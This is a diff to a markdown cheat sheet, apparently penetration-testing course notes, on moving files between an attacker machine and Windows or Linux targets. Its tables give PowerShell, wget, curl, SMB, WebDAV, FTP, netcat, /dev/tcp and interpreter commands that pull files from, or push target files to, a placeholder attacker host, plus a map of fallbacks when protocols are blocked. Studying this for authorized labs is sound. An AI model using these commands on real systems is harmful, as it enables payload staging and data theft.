@@ -2,18 +2,115 @@
 
 > Authorized labs and assessments only. Replace placeholders such as `ATTACK_IP`, `TARGET_IP`, paths, users, and passwords. Prefer authenticated, encrypted transports and verify SHA-256 after every transfer.
 
-## Choose a method
+## Command-level decision matrix
 
-| If available | Use |
+Placeholders used below:
+
+- `PWNBOX_IP` or `ATTACK_IP`: the assessment/Pwnbox address reachable from the target
+- `TARGET_IP`: the Windows or Linux target
+- `FILE`: the filename being transferred
+- `WINDOWS_FILE` / `LINUX_FILE`: the complete source path
+
+### Windows targets
+
+| Method | Port | Direction | Pwnbox command | Windows command | If blocked or unavailable |
+|---|---:|---|---|---|---|
+| PowerShell HTTP | 80/8000 | Pwnbox → Windows | `cd /tmp/share && python3 -m http.server 8000` | `(New-Object Net.WebClient).DownloadFile('http://PWNBOX_IP:8000/FILE','C:\Users\Public\FILE')` | Try `Invoke-WebRequest`, SMB, FTP or WebDAV |
+| Invoke-WebRequest | 80/443 | Pwnbox → Windows | `python3 -m http.server 8000` | `Invoke-WebRequest http://PWNBOX_IP:8000/FILE -OutFile C:\Users\Public\FILE` | Add `-UseBasicParsing` or use WebClient |
+| PowerShell uploadserver | 8000 | Windows → Pwnbox | `cd /tmp/share && python3 -m uploadserver` | `Invoke-FileUpload -Uri http://PWNBOX_IP:8000/upload -File WINDOWS_FILE` | Use SMB, WebDAV, FTP or Base64 POST |
+| Authenticated SMB | 445 | Both | `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test` | `net use n: \\PWNBOX_IP\share /user:test test` | If 445 is blocked, use WebDAV or HTTP/S |
+| WebDAV | 80/443 | Both | `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous` | `copy WINDOWS_FILE \\PWNBOX_IP\DavWWWRoot\` | Use HTTP uploadserver or FTP |
+| FTP download | 21 + data ports | Pwnbox → Windows | `cd /tmp/share && sudo python3 -m pyftpdlib --port 21` | `(New-Object Net.WebClient).DownloadFile('ftp://PWNBOX_IP/FILE','C:\Users\Public\FILE')` | Use HTTP, SMB or WebDAV |
+| FTP upload | 21 + data ports | Windows → Pwnbox | `cd /tmp/share && sudo python3 -m pyftpdlib --port 21 --write` | `(New-Object Net.WebClient).UploadFile('ftp://PWNBOX_IP/FILE','WINDOWS_FILE')` | Confirm `--write`; otherwise use HTTP or SMB |
+| RDP drive | 3389 | Both | `xfreerdp /v:TARGET_IP /u:USER /p:'PASSWORD' /drive:linux,/tmp/share` | Access `\\tsclient\linux` | If redirection is disabled, use SMB, WebDAV or HTTP |
+| WinRM | 5985/5986 | Windows ↔ Windows | Not applicable | `$Session=New-PSSession -ComputerName HOST` then `Copy-Item -ToSession` or `-FromSession` | Requires WinRM and appropriate permissions |
+| Base64 | No dedicated port | Both | `cat FILE \| base64 -w 0; echo` | `[IO.File]::WriteAllBytes('C:\Path\FILE',[Convert]::FromBase64String('BASE64'))` | Use only for small files; use a network protocol for larger files |
+
+SMB after mounting the share:
+
+```cmd
+:: Pwnbox to Windows
+copy n:\FILE C:\Users\Public\FILE
+
+:: Windows to Pwnbox
+copy C:\Windows\System32\drivers\etc\hosts n:\windows-hosts.txt
+```
+
+WebDAV installation and use:
+
+```bash
+sudo pip3 install wsgidav cheroot
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+
+```cmd
+dir \\PWNBOX_IP\DavWWWRoot
+copy C:\Windows\System32\drivers\etc\hosts \\PWNBOX_IP\DavWWWRoot\
+copy \\PWNBOX_IP\DavWWWRoot\FILE C:\Users\Public\FILE
+```
+
+### Linux targets
+
+| Method | Port | Direction | Command | If blocked or unavailable |
+|---|---:|---|---|---|
+| wget | 80/443 | Web server → Linux | `wget http://PWNBOX_IP:8000/FILE -O /tmp/FILE` | Try curl, Python, PHP, Ruby or `/dev/tcp` |
+| curl | 80/443 | Web server → Linux | `curl -o /tmp/FILE http://PWNBOX_IP:8000/FILE` | Try wget or an interpreter |
+| SCP upload | 22 | Pwnbox → Linux | `scp FILE USER@TARGET_IP:/tmp/FILE` | Use HTTP/S if SSH is blocked |
+| SCP download | 22 | Linux → Pwnbox | `scp USER@TARGET_IP:/path/FILE .` | Use HTTP uploadserver if SSH is blocked |
+| HTTPS uploadserver | 443 | Linux → Pwnbox | Pwnbox: `sudo python3 -m uploadserver 443 --server-certificate ~/server.pem`; target uses an HTTP POST client | Use SCP or HTTP if TLS cannot be established |
+| Base64 | No dedicated port | Both | Encode: `cat FILE \| base64 -w 0; echo`; decode: `echo -n 'BASE64' \| base64 -d > FILE` | Only practical for smaller files |
+| Bash `/dev/tcp` | Any chosen TCP port | Pwnbox → Linux | `cat < /dev/tcp/PWNBOX_IP/443 > FILE` | Useful when Netcat, wget and curl are missing |
+
+Temporary HTTP servers taught by the module:
+
+```bash
+python3 -m http.server
+python2.7 -m SimpleHTTPServer
+php -S 0.0.0.0:8000
+ruby -run -ehttpd . -p8000
+```
+
+### Netcat and Ncat directions
+
+| Connection direction | Receiving side | Sending side | Use case |
+|---|---|---|---|
+| Pwnbox connects to target | Target: `nc -l -p 8000 > FILE` | Pwnbox: `nc -q 0 TARGET_IP 8000 < FILE` | Inbound connections to the target are permitted |
+| Pwnbox connects to target with Ncat | Target: `ncat -l -p 8000 --recv-only > FILE` | Pwnbox: `ncat --send-only TARGET_IP 8000 < FILE` | Same direction with explicit completion modes |
+| Target connects to Pwnbox | Target: `nc PWNBOX_IP 443 > FILE` | Pwnbox: `sudo nc -l -p 443 -q 0 < FILE` | Target blocks inbound connections but permits outbound traffic |
+| Target connects to Pwnbox with Ncat | Target: `ncat PWNBOX_IP 443 --recv-only > FILE` | Pwnbox: `sudo ncat -l -p 443 --send-only < FILE` | Same outbound direction with explicit completion modes |
+| Target lacks Netcat | Target: `cat < /dev/tcp/PWNBOX_IP/443 > FILE` | Pwnbox: `sudo nc -l -p 443 -q 0 < FILE` | Bash supports `/dev/tcp` but Netcat is missing |
+
+### Interpreter fallbacks
+
+| Interpreter | Download command |
 |---|---|
-| SSH | SCP or SFTP |
-| HTTPS | curl, wget, PowerShell, or BITS |
-| Windows SMB | Authenticated SMB2/3 share |
-| WinRM | `Copy-Item -ToSession/-FromSession` |
-| RDP | Mapped drive |
-| Only an interpreter | Python, PHP, Ruby, or Perl one-liner |
-| Text-only channel | Base64 for small files |
-| Last-resort lab stream | Ncat/Netcat plus hash verification |
+| Python 2 | `python2.7 -c 'import urllib;urllib.urlretrieve("http://PWNBOX_IP:8000/FILE","FILE")'` |
+| Python 3 | `python3 -c 'import urllib.request;urllib.request.urlretrieve("http://PWNBOX_IP:8000/FILE","FILE")'` |
+| PHP | `php -r '$f=file_get_contents("http://PWNBOX_IP:8000/FILE");file_put_contents("FILE",$f);'` |
+| Ruby | `ruby -e 'require "net/http";File.write("FILE",Net::HTTP.get(URI("http://PWNBOX_IP:8000/FILE")))'` |
+| Perl | `perl -e 'use LWP::Simple;getstore("http://PWNBOX_IP:8000/FILE","FILE");'` |
+
+### Failure-to-fallback map
+
+| Failure | Next method |
+|---|---|
+| External GitHub name cannot resolve | Download on Pwnbox and rehost locally over HTTP, SMB or FTP |
+| PowerShell web cmdlet is unavailable | WebClient → BITS → another allowed protocol |
+| Internet Explorer parsing error | Add `-UseBasicParsing` |
+| HTTPS certificate is untrusted | Use a trusted certificate; use HTTP only inside an isolated lab |
+| HTTP download works but upload fails | `uploadserver`, WebDAV, FTP `--write` or SMB |
+| SMB guest access is blocked | Authenticated Impacket SMB plus `net use` |
+| SMB port 445 is blocked | WebDAV or HTTP/S |
+| FTP download works but upload fails | Restart `pyftpdlib` using `--write` |
+| FTP data connection is blocked | HTTP/S or SCP |
+| SSH port 22 is blocked | HTTP/S |
+| RDP redirected drive is missing | SMB, WebDAV, FTP or HTTP |
+| Inbound connection to target is blocked | Listen on Pwnbox and make the target connect outward |
+| wget/curl is missing | Python, PHP, Ruby, Perl or `/dev/tcp` |
+| No network transfer path exists | Base64 through the available text channel |
+| File contains sensitive assessment data | SCP/SFTP/HTTPS plus file encryption |
+
+Changing tools does not bypass a blocked protocol. For example, WebClient and `Invoke-WebRequest` both still use HTTP/S. Change the client when a program is unavailable; change the protocol when the network path is blocked.
 
 ---
 
